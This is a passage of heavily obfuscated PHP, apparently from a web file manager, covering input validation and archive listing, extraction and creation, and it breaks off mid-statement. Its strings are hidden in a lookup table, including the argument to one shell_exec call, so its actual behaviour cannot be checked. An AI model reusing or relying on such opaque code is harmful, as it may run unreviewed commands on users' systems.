getArray($dãÖÇÜµä•) { goto AØ—éÂò§ó; F²šİ¢ÈÎâ: if (count($C³°šº‰µ) > 0) { show_json(implode($dÛÛÆ·‚é[1870], $C³°šº‰µ), !1); } return $D‰µø‚—œ¥; goto b»ß™™í; AØ—éÂò§ó: $dÛÛÆ·‚é =& $_SERVER[í™]; global $in; $D‰µø‚—œ¥ = array(); goto cœ´ÙÃì«; cœ´ÙÃì«: $C³°šº‰µ = array(); $A‚¿éœ­Ñù = LNG($dÛÛÆ·‚é[1866]); foreach ($dãÖÇÜµä• as $E¾Àğ·¤†‚ => $b§Š˜³¶Õ†) { goto bÀ®×ÕÛö¦; bÀ®×ÕÛö¦: $B‰’İñ÷áÌ = _get($b§Š˜³¶Õ†, $dÛÛÆ·‚é[1232], $A‚¿éœ­Ñù . $dÛÛÆ·‚é[865] . $E¾Àğ·¤†‚); $c­˜œ††Û’ = $E¾Àğ·¤†‚; if (isset($b§Š˜³¶Õ†[$dÛÛÆ·‚é[1867]]) && $b§Š˜³¶Õ†[$dÛÛÆ·‚é[1867]]) { $c­˜œ††Û’ = $b§Š˜³¶Õ†[$dÛÛÆ·‚é[1867]]; } goto D°±—Ü ©Ç; D°±—Ü ©Ç: if (!array_key_exists($E¾Àğ·¤†‚, $in)) { if (array_key_exists($dÛÛÆ·‚é[1868], $b§Š˜³¶Õ†)) { if (!is_null($b§Š˜³¶Õ†[$dÛÛÆ·‚é[1868]])) { $D‰µø‚—œ¥[$c­˜œ††Û’] = $b§Š˜³¶Õ†[$dÛÛÆ·‚é[1868]]; } } else { if (isset($b§Š˜³¶Õ†[$dÛÛÆ·‚é[1869]])) { $C³°šº‰µ[] = $B‰’İñ÷áÌ; } } continue; } if (isset($b§Š˜³¶Õ†[$dÛÛÆ·‚é[1869]]) && $b§Š˜³¶Õ†[$dÛÛÆ·‚é[1869]] == $dÛÛÆ·‚é[282]) { $F½Á´ƒ§õÓ = json_decode($in[$E¾Àğ·¤†‚], !0); if (is_array($F½Á´ƒ§õÓ)) { $D‰µø‚—œ¥[$c­˜œ††Û’] = $F½Á´ƒ§õÓ; } else { if (array_key_exists($dÛÛÆ·‚é[1868], $b§Š˜³¶Õ†)) { if (!is_null($b§Š˜³¶Õ†[$dÛÛÆ·‚é[1868]])) { $D‰µø‚—œ¥[$c­˜œ††Û’] = $b§Š˜³¶Õ†[$dÛÛÆ·‚é[1868]]; } } else { $C³°šº‰µ[] = $B‰’İñ÷áÌ; } } continue; } $FšŒ‡Ğ—ù¶ = _get($b§Š˜³¶Õ†, $dÛÛÆ·‚é[998]); goto B°š½Ñ“ø…; B°š½Ñ“ø…: if (isset($b§Š˜³¶Õ†[$dÛÛÆ·‚é[1869]]) && !self::check($in[$E¾Àğ·¤†‚], $b§Š˜³¶Õ†[$dÛÛÆ·‚é[1869]], $FšŒ‡Ğ—ù¶)) { if (array_key_exists($dÛÛÆ·‚é[1868], $b§Š˜³¶Õ†)) { if (!is_null($b§Š˜³¶Õ†[$dÛÛÆ·‚é[1868]])) { $D‰µø‚—œ¥[$c­˜œ††Û’] = $b§Š˜³¶Õ†[$dÛÛÆ·‚é[1868]]; } } else { $C³°šº‰µ[] = $B‰’İñ÷áÌ; } continue; } $D‰µø‚—œ¥[$c­˜œ††Û’] = $in[$E¾Àğ·¤†‚]; goto féÃë©«ò; féÃë©«ò: } goto F²šİ¢ÈÎâ; b»ß™™í: } public static function reg($cÈ—¢Ê‘ƒ = "\x72\x65\161\x75\x69\x72\x65") { static $a¥Ì»â´ƒ = array("\x72\145\161\165\151\x72\x65" => "\56\x2b", "\x6e\x75\155\x62\x65\162" => "\x5c\144\53", "\x69\156\x74\145\x67\x65\x72" => "\x5c\144\x2b", "\150\x65\170" => "\x5b\60\55\71\101\55\x46\141\55\x66\x5d\x2b", "\x69\x6e\164" => "\x5b\x2d\x5c\53\x5d\x3f\x5c\x64\x2b", "\x62\157\157\154" => "\x30\x7c\x31", "\146\154\157\x61\164" => "\133\55\x5c\x2b\x5d\77\134\144\x2b\50\134\56\x5c\x64\x2b\51\77", "\145\x6e\x67\154\151\163\150" => "\x5b\101\x2d\132\141\x2d\x7a\x20\x5d\53", "\143\150\x69\x6e\x65\163\145" => "\133\x5c\x78\173\64\x65\60\x30\175\x2d\134\170\x7b\x39\x66\x61\x35\x7d\135\53", "\x68\x61\163\x43\x68\151\x6e\x65\x73\x65" => "\57\x28\x5b\x5c\170\x7b\x34\145\60\x30\x7d\x2d\x5c\170\173\71\146\141\65\175\135\53\51\57\165", "\145\x6d\141\x69\154" => "\134\167\53\50\x5b\x5c\56\134\55\x5d\134\167\x2b\x29\52\134\x40\134\167\x2b\50\x5b\x5c\56\x5c\x2d\135\134\167\x2b\x29\x2a\134\x2e\134\x77\53", "\x70\150\157\x6e\x65" => "\61\x5b\63\55\x39\x5d\134\144\173\x39\175", "\x74\145\154\160\x68\x6f\156\145" => "\50\x5c\50\x5c\x64\x7b\x33\x2c\x34\175\x5c\51\x7c\x5c\144\x7b\x33\54\x34\x7d\55\x7c\x5c\163\51\x3f\134\144\173\x37\54\61\64\x7d", "\x75\x72\x6c" => "\50\150\x74\164\x70\x7c\x66\164\160\174\150\164\x74\160\x73\x29\x3a\134\57\134\x2f\x5b\134\167\x5c\x2d\137\x5d\x2b\x28\x5c\x2e\133\x5c\167\x5c\x2d\x5f\135\x2b\51\53\x28\x5b\134\167\x5c\55\134\x2e\54\100\77\x5e\75\45\x26\72\x5c\57\176\x5c\53\x23\135\x2a\133\134\x77\134\55\134\x40\x3f\x5e\x3d\45\46\x5c\x2f\x7e\134\53\43\135\x29\x3f", "\165\162\154\x46\x75\x6c\x6c" => "\133\141\55\x7a\x41\55\172\x5d\x2b\x3a\x5c\57\x5c\57\x5b\x5e\134\163\135\52", "\x69\x70" => "\x28\134\144\173\61\54\63\x7d\x5c\x2e\51\173\63\175\x28\134\x64\173\61\x2c\x33\175\51", "\x7a\151\x70" => "\x5b\x31\x2d\x39\x5d\134\144\x7b\65\175\x28\x3f\41\x5c\x64\51", "\151\x64\103\x61\162\144" => "\x28\134\144\x7b\x31\x35\175\x29\x7c\x28\x5c\144\x7b\x31\67\x7d\50\x5c\144\x7c\x58\x7c\170\51\51", "\143\157\154\157\162" => "\x23\x28\133\60\x2d\71\x41\x2d\106\141\55\146\x5d\173\63\175\x7c\133\60\x2d\71\101\x2d\106\x61\55\146\x5d\173\x36\175\x29", "\164\x69\155\x65" => "\x28\x5b\x30\55\x31\x5d\x5c\x64\174\62\x5b\x30\55\x34\135\51\72\x5b\x30\55\x35\135\x5c\x64", "\x64\141\164\x65" => "\134\x64\x7b\64\175\x5b\x2d\134\57\135\77\50\x30\x5b\x31\55\71\x5d\x7c\61\133\60\55\62\135\51\133\x2d\134\x2f\x5d\77\x28\x5b\60\x2d\62\135\x5c\144\x7c\63\x5b\x30\x2d\x31\135\51", "\144\141\x74\x65\124\x69\155\x65" => "\x5c\x64\173\x34\175\133\55\134\57\x5d\x3f\x28\x30\133\x31\55\71\135\x7c\x31\x5b\60\55\x32\x5d\51\x5b\55\134\x2f\x5d\77\50\133\60\55\x32\135\134\144\x7c\63\x5b\60\x2d\x31\x5d\51\x5c\163\53\50\133\x30\x2d\x31\135\134\144\x7c\62\133\x30\55\64\135\x29\x3a\133\x30\x2d\65\x5d\134\144", "\160\141\163\x73\167\157\162\x64" => "\50\x3f\x3d\x2e\x2a\134\x64\51\x28\77\75\56\x2a\x5b\141\55\172\135\x29\50\77\x3d\x2e\x2a\x5b\101\55\x5a\x5d\51\56\173\x38\54\62\60\x7d", "\x6b\145\x79" => "\133\101\55\x5a\141\x2d\x7a\x30\55\x39\137\134\55\x5c\56\x5d\x2b", "\x6b\x65\171\106\x75\154\x6c" => "\x5b\x41\55\x5a\x61\55\172\60\x2d\71\137\x5c\x2d\134\56\134\163\54\135\x2b"); if (!$cÈ—¢Ê‘ƒ) { return $a¥Ì»â´ƒ; } return $a¥Ì»â´ƒ[$cÈ—¢Ê‘ƒ]; } public static function check($DÖõˆœãò, $b½ç­¥î’½, $DÆ²¶¯á…ê = null) { $C›¥‹íĞ¡— =& $_SERVER[í™]; switch ($b½ç­¥î’½) { case $C›¥‹íĞ¡—[7]: return in_array($DÖõˆœãò, $DÆ²¶¯á…ê); break; case $C›¥‹íĞ¡—[1871]: return floatval($DÖõˆœãò) > $DÆ²¶¯á…ê; break; case $C›¥‹íĞ¡—[1872]: return floatval($DÖõˆœãò) < $DÆ²¶¯á…ê; break; case $C›¥‹íĞ¡—[325]: return strlen($DÖõˆœãò) >= $DÆ²¶¯á…ê[0] && strlen($DÖõˆœãò) <= $DÆ²¶¯á…ê[1]; break; case $C›¥‹íĞ¡—[325]: if (is_array($DÆ²¶¯á…ê)) { return strlen($DÖõˆœãò) >= $DÆ²¶¯á…ê[0] && strlen($DÖõˆœãò) <= $DÆ²¶¯á…ê[1]; break; } else { return strlen($DÖõˆœãò) == $DÆ²¶¯á…ê; break; } case $C›¥‹íĞ¡—[321]: return floatval($DÖõˆœãò) >= $DÆ²¶¯á…ê[0] && floatval($DÖõˆœãò) <= $DÆ²¶¯á…ê[1]; break; } $dŒµ•‹õ‚ = self::reg(!1); $b½ç­¥î’½ = isset($dŒµ•‹õ‚[$b½ç­¥î’½]) ? $dŒµ•‹õ‚[$b½ç­¥î’½] : $b½ç­¥î’½; if (substr($b½ç­¥î’½, 0, 1) != $C›¥‹íĞ¡—[8]) { $b½ç­¥î’½ = $C›¥‹íĞ¡—[1873] . $b½ç­¥î’½ . $C›¥‹íĞ¡—[1874]; } return preg_match($b½ç­¥î’½, $DÖõˆœãò) === 1; } public static function get($D½›¨ã¨¢, $eóç‰¿„õ÷ = null, $eá¨£ƒÌåµ = null, $Fï£¢Å¿ = null) { goto b¡ÀµØÏ; CÄŸæ…é: if (!is_null($Fï£¢Å¿)) { $eÙµâï¹[$c¨ÏÀáÆ£[998]] = $Fï£¢Å¿; } if (!is_null($eóç‰¿„õ÷)) { $eÙµâï¹[$c¨ÏÀáÆ£[1869]] = $eóç‰¿„õ÷; } $BÒ¯³ò–ÕÒ = Input::getArray(array($D½›¨ã¨¢ => $eÙµâï¹)); goto eèÈö¼š¤ˆ; b¡ÀµØÏ: $c¨ÏÀáÆ£ =& $_SERVER[í™]; $eÙµâï¹ = array(); if (!is_null($eá¨£ƒÌåµ)) { $eÙµâï¹[$c¨ÏÀáÆ£[34]] = $eá¨£ƒÌåµ; } goto CÄŸæ…é; eèÈö¼š¤ˆ: return $BÒ¯³ò–ÕÒ[$D½›¨ã¨¢]; goto B£°½‚†¹ˆ; B£°½‚†¹ˆ: } } class KodArchive { static function init() { goto e›¥Ø‡¡ñÎ; a‘öì›à©Í: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $eæã‚±²ß[1881]; require_once ARCHIVE_LIB . $eæã‚±²ß[1882]; goto f‹¦ãœ¤‡; e›¥Ø‡¡ñÎ: $eæã‚±²ß =& $_SERVER[í™]; if (defined($eæã‚±²ß[1875])) { return; } define($eæã‚±²ß[1875], SDK_DIR . $eæã‚±²ß[1876]); goto E÷øòÓŞ’; Bé£‹¬Ÿ‹: require_once ARCHIVE_LIB . $eæã‚±²ß[1886]; goto B÷ê£‘·­ï; f‹¦ãœ¤‡: require_once ARCHIVE_LIB . $eæã‚±²ß[1883]; require_once ARCHIVE_LIB . $eæã‚±²ß[1884]; require_once ARCHIVE_LIB . $eæã‚±²ß[1885]; goto Bé£‹¬Ÿ‹; E÷øòÓŞ’: define($eæã‚±²ß[1877], TEMP_FILES); define($eæã‚±²ß[1878], TEMP_FILES); define($eæã‚±²ß[1879], $eæã‚±²ß[1880]); goto a‘öì›à©Í; B÷ê£‘·­ï: } static function checkIfType($aŸ²’Šğ³Í, $cµ§™†ÓŒ£) { goto e–—ÅõñÚ; e–—ÅõñÚ: $AòòÁÍøôÒ =& $_SERVER[í™]; self::init(); $Eæƒ…¥óÕ˜ = array($AòòÁÍøôÒ[301] => array($AòòÁÍøôÒ[301], $AòòÁÍøôÒ[1887], $AòòÁÍøôÒ[1888], $AòòÁÍøôÒ[1889]), $AòòÁÍøôÒ[1890] => array($AòòÁÍøôÒ[1890], $AòòÁÍøôÒ[1891], $AòòÁÍøôÒ[1029], $AòòÁÍøôÒ[1027]), $AòòÁÍøôÒ[1031] => array($AòòÁÍøôÒ[1031], $AòòÁÍøôÒ[1892], $AòòÁÍøôÒ[1893], $AòòÁÍøôÒ[1894], $AòòÁÍøôÒ[1895], $AòòÁÍøôÒ[1896], $AòòÁÍøôÒ[1897])); goto D™ò­Í‰–Ç; F„È¾É¡ª: return $BàèÔô›Ù•; goto C¶¿ÛˆôÁ˜; D™ò­Í‰–Ç: $BàèÔô›Ù• = in_array($aŸ²’Šğ³Í, $Eæƒ…¥óÕ˜[$cµ§™†ÓŒ£]); if ($BàèÔô›Ù• && ($cµ§™†ÓŒ£ == $AòòÁÍøôÒ[301] || $cµ§™†ÓŒ£ == $AòòÁÍøôÒ[1890]) && (!function_exists($AòòÁÍøôÒ[1898]) || !function_exists($AòòÁÍøôÒ[1899]))) { show_tips($AòòÁÍøôÒ[1900]); } if ($BàèÔô›Ù• && $cµ§™†ÓŒ£ == $AòòÁÍøôÒ[1031] && (!function_exists($AòòÁÍøôÒ[1901]) || !strstr(shell_exec($AòòÁÍøôÒ[1902]), $AòòÁÍøôÒ[1903]))) { show_tips($AòòÁÍøôÒ[1904]); } goto F„È¾É¡ª; C¶¿ÛˆôÁ˜: } static function listContent($b·¾½Í ßÄ, $bÌƒªœ›÷‰ = true) { $b•¬Ñ”Ä¡» =& $_SERVER[í™]; self::init(); $cÒ¶‹æƒ©Š = !empty($GLOBALS[$b•¬Ñ”Ä¡»[1035]]) ? $GLOBALS[$b•¬Ñ”Ä¡»[1035]] : get_path_ext($b·¾½Í ßÄ); $Bœ¿Û¯›õÁ = !1; if (self::checkIfType($cÒ¶‹æƒ©Š, $b•¬Ñ”Ä¡»[1890])) { $A¯÷é¸ª‡Ğ = PclTarList($b·¾½Í ßÄ, $cÒ¶‹æƒ©Š); $Bœ¿Û¯›õÁ = array(); for ($dáŠùÕŠ¹Ò = 0; $dáŠùÕŠ¹Ò < count($A¯÷é¸ª‡Ğ); $dáŠùÕŠ¹Ò++) { $F…ãÏˆŞàÀ = $A¯÷é¸ª‡Ğ[$dáŠùÕŠ¹Ò]; if ($F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[1905]] == $b•¬Ñ”Ä¡»[1906] || $F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[1905]] == $b•¬Ñ”Ä¡»[1907]) { continue; } if ($bÌƒªœ›÷‰) { $F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[1908]] = ltrim($F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[1908]], $b•¬Ñ”Ä¡»[1141]); } if ($F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[1905]] == $b•¬Ñ”Ä¡»[1909]) { $F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[76]] = !0; } else { $F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[76]] = !1; } $F…ãÏˆŞàÀ[$b•¬Ñ”Ä¡»[1022]] = $dáŠùÕŠ¹Ò; $Bœ¿Û¯›õÁ[] = $F…ãÏˆŞàÀ; } } else { if (self::checkIfType($cÒ¶‹æƒ©Š, $b•¬Ñ”Ä¡»[1031])) { $EŸôŒ§å¸Š = kodRarArchive::listContent($b·¾½Í ßÄ); if (!$EŸôŒ§å¸Š[$b•¬Ñ”Ä¡»[1018]]) { return $EŸôŒ§å¸Š; } else { $Bœ¿Û¯›õÁ = $EŸôŒ§å¸Š[$b•¬Ñ”Ä¡»[1020]]; } } else { if (kodZipArchive::support($b•¬Ñ”Ä¡»[354])) { $Bœ¿Û¯›õÁ = kodZipArchive::listContent($b·¾½Í ßÄ); } else { $BÛ÷¦Âïíê = new PclZip($b·¾½Í ßÄ); $Bœ¿Û¯›õÁ = $BÛ÷¦Âïíê->listContent(); } } } if ($Bœ¿Û¯›õÁ) { $bØ¡ÁíÀÑ÷ = unzip_charset_get($Bœ¿Û¯›õÁ); $bÌƒªœ›÷‰ = $bÌƒªœ›÷‰ && function_exists($b•¬Ñ”Ä¡»[65]); for ($dáŠùÕŠ¹Ò = 0; $dáŠùÕŠ¹Ò < count($Bœ¿Û¯›õÁ); $dáŠùÕŠ¹Ò++) { $Bœ¿Û¯›õÁ[$dáŠùÕŠ¹Ò][$b•¬Ñ”Ä¡»[1908]] = str_replace(array($b•¬Ñ”Ä¡»[1058], $b•¬Ñ”Ä¡»[1910]), $b•¬Ñ”Ä¡»[752], $Bœ¿Û¯›õÁ[$dáŠùÕŠ¹Ò][$b•¬Ñ”Ä¡»[1908]]); if ($bÌƒªœ›÷‰) { $Bœ¿Û¯›õÁ[$dáŠùÕŠ¹Ò][$b•¬Ñ”Ä¡»[1908]] = iconv_to($Bœ¿Û¯›õÁ[$dáŠùÕŠ¹Ò][$b•¬Ñ”Ä¡»[1908]], $bØ¡ÁíÀÑ÷, $b•¬Ñ”Ä¡»[326]); unset($Bœ¿Û¯›õÁ[$dáŠùÕŠ¹Ò][$b•¬Ñ”Ä¡»[1911]]); } } return array($b•¬Ñ”Ä¡»[1018] => !0, $b•¬Ñ”Ä¡»[1020] => $Bœ¿Û¯›õÁ); } else { return array($b•¬Ñ”Ä¡»[1018] => !1, $b•¬Ñ”Ä¡»[1020] => $Bœ¿Û¯›õÁ); } } static function extract($cˆ¨¡—œ¸½, $DÔéäÙÉ®Ğ, $CŞÉ£¹¥ ‘ = "\x2d\61", &$CˆÀÒÁ¡œ = false) { goto eÈ¡»½“ÕÏ; EÄÂå¶â¥Ë: if (self::checkIfType($a‡°ø‚µÊ„, $D³»ëŠ±·›[1890])) { if ($CŞÉ£¹¥ ‘ != $D³»ëŠ±·›[1017]) { $E¬ƒœ“° = unzip_pre_name($E¬ƒœ“°); $FÜœ‡ğÔ’à = unzip_pre_name($FÜœ‡ğÔ’à); $e·ŒêØøÕÚ = PclTarExtractList($cˆ¨¡—œ¸½, array($E¬ƒœ“°), $DÔéäÙÉ®Ğ, $FÜœ‡ğÔ’à, $a‡°ø‚µÊ„); } else { $e·ŒêØøÕÚ = PclTarExtract($cˆ¨¡—œ¸½, $DÔéäÙÉ®Ğ, $D³»ëŠ±·›[361], $a‡°ø‚µÊ„); } return array($D³»ëŠ±·›[1018] => $e·ŒêØøÕÚ, $D³»ëŠ±·›[1020] => PclErrorString(!0)); } else { if (self::checkIfType($a‡°ø‚µÊ„, $D³»ëŠ±·›[1031])) { return kodRarArchive::extract($cˆ¨¡—œ¸½, $DÔéäÙÉ®Ğ, $a‡°ø‚µÊ„, $CˆÀÒÁ¡œ); } else { if (kodZipArchive::support($D³»ëŠ±·›[1912])) { return kodZipArchive::extract($cˆ¨¡—œ¸½, $DÔéäÙÉ®Ğ, $CˆÀÒÁ¡œ); } else { $c¡ÁÉ¨ºª½ = new PclZip($cˆ¨¡—œ¸½); if ($CŞÉ£¹¥ ‘ != $D³»ëŠ±·›[1017]) { $e·ŒêØøÕÚ = $c¡ÁÉ¨ºª½->extract(PCLZIP_OPT_PATH, $DÔéäÙÉ®Ğ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $D³»ëŠ±·›[1913], PCLZIP_OPT_BY_NAME, $cñáîæáŒÃ[$D³»ëŠ±·›[1908]], PCLZIP_OPT_REMOVE_PATH, $FÜœ‡ğÔ’à, PCLZIP_OPT_REPLACE_NEWER); } else { $e·ŒêØøÕÚ = $c¡ÁÉ¨ºª½->extract(PCLZIP_OPT_PATH, $DÔéäÙÉ®Ğ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $D³»ëŠ±·›[1913], PCLZIP_OPT_REPLACE_NEWER); } return array($D³»ëŠ±·›[1018] => $e·ŒêØøÕÚ, $D³»ëŠ±·›[1020] => $c¡ÁÉ¨ºª½->errorName(!0)); } } } return array($D³»ëŠ±·›[1018] => !1, $D³»ëŠ±·›[1020] => $D³»ëŠ±·›[1914]); goto BÕØÖĞÖÔ; C–ŞÍİŒÚ: $D‡ôØíá†˜ = self::listContent($cˆ¨¡—œ¸½, !1); if (!$D‡ôØíá†˜[$D³»ëŠ±·›[1018]]) { return $D‡ôØíá†˜; } if ($CŞÉ£¹¥ ‘ != $D³»ëŠ±·›[1017]) { goto AËÜÇ¿êæ®; AËÜÇ¿êæ®: $cñáîæáŒÃ = self::fileIndex($D‡ôØíá†˜[$D³»ëŠ±·›[1020]], $CŞÉ£¹¥ ‘); $CˆÀÒÁ¡œ = str_replace(array($D³»ëŠ±·›[1058], $D³»ëŠ±·›[1910]), $D³»ëŠ±·›[70], $cñáîæáŒÃ[$D³»ëŠ±·›[1908]]); $E¬ƒœ“° = $CˆÀÒÁ¡œ; goto a’†‹‡ªŒ‹; a’†‹‡ªŒ‹: if ($GLOBALS[$D³»ëŠ±·›[6]][$D³»ëŠ±·›[1139]] != $D³»ëŠ±·›[326]) { $E¬ƒœ“° = unzip_pre_name($CˆÀÒÁ¡œ); } $FÜœ‡ğÔ’à = get_path_father($CˆÀÒÁ¡œ); if ($FÜœ‡ğÔ’à == $CˆÀÒÁ¡œ) { $FÜœ‡ğÔ’à = $D³»ëŠ±·›[33]; } goto BİÇæÑæà; BİÇæÑæà: if ($cñáîæáŒÃ[$D³»ëŠ±·›[76]]) { $E¬ƒœ“° = rtrim($E¬ƒœ“°, $D³»ëŠ±·›[8]) . $D³»ëŠ±·›[8]; $CˆÀÒÁ¡œ = array($CˆÀÒÁ¡œ); } $E«­¥ìì‘ = str_replace($D³»ëŠ±·›[93], $D³»ëŠ±·›[8], $E¬ƒœ“°); if (substr($E«­¥ìì‘, -1) == $D³»ëŠ±·›[8]) { if (!strstr(trim($E«­¥ìì‘, $D³»ëŠ±·›[8]), $D³»ëŠ±·›[8])) { $DÔéäÙÉ®Ğ = $DÔéäÙÉ®Ğ . get_path_this($E«­¥ìì‘) . $D³»ëŠ±·›[8]; } } else { if ($FÜœ‡ğÔ’à == $E¬ƒœ“°) { $FÜœ‡ğÔ’à = $D³»ëŠ±·›[33]; } } goto CĞ‹à¿×§; CĞ‹à¿×§: } goto EÄÂå¶â¥Ë; eÈ¡»½“ÕÏ: $D³»ëŠ±·› =& $_SERVER[í™]; self::init(); $a‡°ø‚µÊ„ = !empty($GLOBALS[$D³»ëŠ±·›[1035]]) ? $GLOBALS[$D³»ëŠ±·›[1035]] : get_path_ext($cˆ¨¡—œ¸½); goto C–ŞÍİŒÚ; BÕØÖĞÖÔ: } static function fileIndex($E¦ô½ù ‹, $dÔå‹ª‘Õ¶, $Bå¡ç¥…ß’ = false) { goto Cã”ÄÏë°; CµÆ›×Ñ“Ê: $c”õñ’‹âÏ = $b²ó §ó˜; if ($Bå¡ç¥…ß’) { $c”õñ’‹âÏ = $b²ó §ó˜[$Bå¡ç¥…ß’]; if ($b²ó §ó˜[$Aâà­ƒœ[76]]) { $c”õñ’‹âÏ = rtrim($c”õñ’‹âÏ, $Aâà­ƒœ[8]) . $Aâà­ƒœ[8]; } } return $c”õñ’‹âÏ; goto DœÎÒ§¤™´; aÃÃÏ¹„ª—: $B‹±Şƒ–°è = count($E¦ô½ù ‹); for ($F¦‚Ñ©ª† = 0; $F¦‚Ñ©ª† < $B‹±Şƒ–°è; $F¦‚Ñ©ª†++) { if ($dÔå‹ª‘Õ¶ == $E¦ô½ù ‹[$F¦‚Ñ©ª†][$Aâà­ƒœ[1022]]) { $b²ó §ó˜ = $E¦ô½ù ‹[$F¦‚Ñ©ª†]; break; } } if (!$b²ó §ó˜) { show_tips($Aâà­ƒœ[1915]); } goto CµÆ›×Ñ“Ê; Cã”ÄÏë°: $Aâà­ƒœ =& $_SERVER[í™]; self::init(); if (!is_array($E¦ô½ù ‹)) { return !1; } goto aÃÃÏ¹„ª—; DœÎÒ§¤™´: } static function extractZipFile($B‡Ì˜¹°š½, $d…¦Ò†á¯Ç, $FÖºË¼Îİˆ = false) { goto c®³‚“ˆ­; dÖ£¶Óâ÷: if (!file_exists($b©æ¿Î¤¹)) { return !1; } @rename($b©æ¿Î¤¹, $E‘À…ùÉ¿È); return $E‘À…ùÉ¿È; goto cê˜Ó´óåÑ; c®³‚“ˆ­: $A–İÔ©£¡ù =& $_SERVER[í™]; self::init(); $cÚŒ‘ææÉ  = TEMP_FILES . hash_path($B‡Ì˜¹°š½) . $A–İÔ©£¡ù[8]; goto d‚³™ƒ–ô“; d‚³™ƒ–ô“: mk_dir($cÚŒ‘ææÉ ); $E‘À…ùÉ¿È = $cÚŒ‘ææÉ  . md5($B‡Ì˜¹°š½ . $d…¦Ò†á¯Ç); if ($FÖºË¼Îİˆ) { $E‘À…ùÉ¿È = $cÚŒ‘ææÉ  . $FÖºË¼Îİˆ; } goto Cãöİï¾ë¹; F°»ßß–¾Ë: $DÂŞ©ùù = get_path_father($d…¦Ò†á¯Ç); if ($DÂŞ©ùù == $d…¦Ò†á¯Ç) { $DÂŞ©ùù = $A–İÔ©£¡ù[33]; } $A¯–äªÈ = $aŠ¶¹Òâ¦‚->extract(PCLZIP_OPT_PATH, $cÚŒ‘ææÉ , PCLZIP_CB_PRE_FILE_NAME, $A–İÔ©£¡ù[1913], PCLZIP_OPT_REMOVE_PATH, $DÂŞ©ùù, PCLZIP_OPT_BY_NAME, $d…¦Ò†á¯Ç); goto dÖ£¶Óâ÷; Cãöİï¾ë¹: if (file_exists($E‘À…ùÉ¿È)) { return $E‘À…ùÉ¿È; } $aŠ¶¹Òâ¦‚ = new PclZip($B‡Ì˜¹°š½); $b©æ¿Î¤¹ = unzip_filter_ext($cÚŒ‘ææÉ  . get_path_this($d…¦Ò†á¯Ç)); goto F°»ßß–¾Ë; cê˜Ó´óåÑ: } static function filePreview($E™¾¡ñ´„, $F”™ñˆİÉ¯, $b›Æ²íƒô– = false, $eéßßœƒŸ = false) { goto b¾äÅ¡´´®; b›æÇ¢©ƒ: mk_dir($F‹¨óã«›); $Aæ¶½Äí¸ = $F‹¨óã«› . md5($E™¾¡ñ´„ . $F”™ñˆİÉ¯ . $eéßßœƒŸ); $C¦†ê¡¼‹Š = $Bš‹³âÊÎÁ[33]; goto EÚš¹İÄ°ª; CÁŒ¡‰Üö: if (!$bˆÄ³¸„‹¤[$Bš‹³âÊÎÁ[1018]]) { show_json($bˆÄ³¸„‹¤[$Bš‹³âÊÎÁ[1020]], !1); } if (!file_exists($B†¤Œë«÷í)) { show_json($Bš‹³âÊÎÁ[1917], !1); } @rename($B†¤Œë«÷í, $Aæ¶½Äí¸); goto CÀƒá¶Ø±Ò; Eß¶ÎÓ‹İÎ: $C¦†ê¡¼‹Š = unzip_pre_name($C¦†ê¡¼‹Š); $d¾†‚ÁÉ›à = get_path_this($C¦†ê¡¼‹Š); $B†¤Œë«÷í = unzip_filter_ext($F‹¨óã«› . $d¾†‚ÁÉ›à); goto CÁŒ¡‰Üö; b¾äÅ¡´´®: $Bš‹³âÊÎÁ =& $_SERVER[í™]; self::init(); $F‹¨óã«› = TEMP_FILES . hash_path($E™¾¡ñ´„) . $Bš‹³âÊÎÁ[8]; goto b›æÇ¢©ƒ; CÀƒá¶Ø±Ò: if (!file_exists($Aæ¶½Äí¸)) { del_dir($F‹¨óã«›); show_json($Bš‹³âÊÎÁ[1918]); } IO::fileOut($Aæ¶½Äí¸, $b›Æ²íƒô–, $d¾†‚ÁÉ›à); goto bš˜ï°Ú™; EÚš¹İÄ°ª: $bˆÄ³¸„‹¤ = self::extract($E™¾¡ñ´„, $F‹¨óã«›, $F”™ñˆİÉ¯, $C¦†ê¡¼‹Š); if (is_array($C¦†ê¡¼‹Š)) { show_json($Bš‹³âÊÎÁ[1916], !1); } if (file_exists($Aæ¶½Äí¸)) { IO::fileOut($Aæ¶½Äí¸, $b›Æ²íƒô–, get_path_this($C¦†ê¡¼‹Š)); return; } goto Eß¶ÎÓ‹İÎ; bš˜ï°Ú™: } static function create($c–ÎÀÜÖö·, $fòÍ‡ºöÕê) { $AéÆÑÌ„ =& $_SERVER[í™]; self::init(); $DïÚ„±áõ” = get_path_ext($c–ÎÀÜÖö·); $aŒ±˜ç¶Ã = !1; if (self::checkIfType($DïÚ„±áõ”, $AéÆÑÌ„[301])) { if (kodZipArchive::support($AéÆÑÌ„[997])) { return kodZipArchive::create($c–ÎÀÜÖö·, $fòÍ‡ºöÕê); } $cŒˆöÄçé = new PclZip($c–ÎÀÜÖö·); foreach ($fòÍ‡ºöÕê as $F¸ä©ë­æá => $E¨æ“ù¿¢) { $E¨æ“ù¿¢ = str_replace($AéÆÑÌ„[469], $AéÆÑÌ„[8], $E¨æ“ù¿¢); $Aê†ÏÊ‹… = Kodio::clear(get_path_father($E¨æ“ù¿¢)); if ($F¸ä©ë­æá == 0) { $aŒ±˜ç¶Ã = $cŒˆöÄçé->create($E¨æ“ù¿¢, PCLZIP_OPT_REMOVE_PATH, $Aê†ÏÊ‹…, PCLZIP_CB_PRE_FILE_NAME, $AéÆÑÌ„[1919]); continue; } $aŒ±˜ç¶Ã = $cŒˆöÄçé->add($E¨æ“ù¿¢, PCLZIP_OPT_REMOVE_PATH, $Aê†ÏÊ‹…, PCLZIP_CB_PRE_FILE_NAME, $AéÆÑÌ„[1919]); } } else { if (self::checkIfType($DïÚ„±áõ”, $AéÆÑÌ„[1890])) { foreach ($fòÍ‡ºöÕê as $F¸ä©ë­æá => $E¨æ“ù¿¢) { $E¨æ“ù¿¢ = str_replace($AéÆÑÌ„[469], $AéÆÑÌ„[8], 